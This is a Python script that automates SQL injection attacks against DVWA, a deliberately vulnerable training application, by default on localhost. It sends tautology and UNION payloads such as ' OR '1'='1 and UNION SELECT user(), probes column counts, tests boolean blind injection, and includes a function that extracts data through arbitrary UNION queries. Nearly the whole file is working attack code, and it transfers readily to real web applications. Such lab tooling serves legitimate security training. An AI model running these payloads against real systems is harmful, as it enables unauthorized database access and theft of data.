#!/usr/bin/env python3
"""
SQL Injection Testing Script for DVWA
Tests SQL injection vulnerabilities across different security levels
"""

import requests
import argparse
import re
from urllib.parse import urljoin

class DVWASQLInjection:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('PHPSESSID', session_cookie)
        self.security_level = None
    
    def set_security_level(self, level):
        """Set DVWA security level"""
        url = urljoin(self.base_url, '/security.php')
        data = {
            'security': level,
            'seclev_submit': 'Submit'
        }
        response = self.session.post(url, data=data)
        if response.status_code == 200:
            self.security_level = level
            print(f"[+] Security level set to: {level}")
            return True
        return False
    
    def test_basic_injection(self):
        """Test basic SQL injection"""
        print("\n[*] Testing basic SQL injection...")
        url = urljoin(self.base_url, '/vulnerabilities/sqli/')
        
        # Test payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL --",
            "' UNION SELECT user() --"
        ]
        
        for payload in payloads:
            params = {'id': payload, 'Submit': 'Submit'}
            response = self.session.get(url, params=params)
            
            if response.status_code == 200:
                # Check for SQL error or success
                if 'mysql' in response.text.lower() or 'error' in response.text.lower():
                    print(f"[!] Potential SQL injection with payload: {payload}")
                    print(f"    Response contains database errors")
                elif len(response.text) > 5000:  # Successful injection might return more data
                    print(f"[+] Possible injection success with: {payload}")
    
    def test_union_injection(self):
        """Test UNION-based SQL injection"""
        print("\n[*] Testing UNION-based injection...")
        url = urljoin(self.base_url, '/vulnerabilities/sqli/')
        
        # Determine number of columns
        for i in range(1, 10):
            payload = f"' UNION SELECT {'NULL, ' * i}NULL --"
            params = {'id': payload.replace(', NULL --', 'NULL --'), 'Submit': 'Submit'}
            response = self.session.get(url, params=params)
            
            if 'error' not in response.text.lower() and 'mysql' not in response.text.lower():
                print(f"[+] Number of columns: {i}")
                break
    
    def test_boolean_blind(self):
        """Test Boolean-based blind SQL injection"""
        print("\n[*] Testing Boolean-based blind injection...")
        url = urljoin(self.base_url, '/vulnerabilities/sqli_blind/')
        
        # Test true condition
        true_payload = "' OR 1=1 --"
        params = {'id': true_payload, 'Submit': 'Submit'}
        response_true = self.session.get(url, params=params)
        
        # Test false condition
        false_payload = "' OR 1=2 --"
        params = {'id': false_payload, 'Submit': 'Submit'}
        response_false = self.session.get(url, params=params)
        
        if response_true.text != response_false.text:
            print("[+] Boolean-based blind injection may be possible")
            print(f"    True response length: {len(response_true.text)}")
            print(f"    False response length: {len(response_false.text)}")
    
    def extract_data(self, query):
        """Extract data using SQL injection"""
        url = urljoin(self.base_url, '/vulnerabilities/sqli/')
        payload = f"' UNION SELECT {query} --"
        params = {'id': payload, 'Submit': 'Submit'}
        response = self.session.get(url, params=params)
        
        # Simple extraction (would need more sophisticated parsing in real scenario)
        return response.text
    
    def run_all_tests(self):
        """Run all SQL injection tests"""
        print("=" * 60)
        print("DVWA SQL Injection Testing")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print(f"Security Level: {self.security_level}")
        
        self.test_basic_injection()
        self.test_union_injection()
        self.test_boolean_blind()
        
        print("\n[*] SQL injection testing completed")

def main():
    parser = argparse.ArgumentParser(
        description='SQL injection testing for DVWA'
    )
    parser.add_argument(
        '--url',
        default='http://localhost/dvwa',
        help='DVWA base URL'
    )
    parser.add_argument(
        '--session',
        required=True,
        help='DVWA session cookie (PHPSESSID)'
    )
    parser.add_argument(
        '--security-level',
        choices=['low', 'medium', 'high', 'impossible'],
        default='low',
        help='DVWA security level'
    )
    
    args = parser.parse_args()
    
    tester = DVWASQLInjection(args.url, args.session)
    
    if tester.set_security_level(args.security_level):
        tester.run_all_tests()
    else:
        print("[!] Failed to set security level")

if __name__ == '__main__':
    print("[!] This script requires authentication to DVWA")
    print("[!] Please provide a valid session cookie")
    print("[!] Usage: python sql_injection_dvwa.py --url http://localhost/dvwa --session YOUR_SESSION_COOKIE")
    main()

